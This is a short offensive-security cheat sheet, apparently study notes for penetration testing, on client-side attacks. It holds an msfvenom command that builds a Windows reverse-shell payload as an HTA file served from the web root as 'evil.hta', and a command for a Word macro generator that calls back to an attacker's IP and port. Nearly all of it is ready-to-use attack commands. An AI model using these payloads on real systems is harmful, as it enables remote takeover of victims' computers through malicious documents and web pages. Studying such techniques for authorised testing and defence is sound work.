## Client-Side Attacks
### HTA Attack in Action

-> get web browser name, operating system, device type  
https://explore.whatismybrowser.com/useragents/parse/#parse-useragent
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
```

### Microsoft Word Macro Attack
```
python evil_macro.py -l <ip> -p <port> -o macro.txt
```
https://github.com/rodolfomarianocy/Evil-Macro/
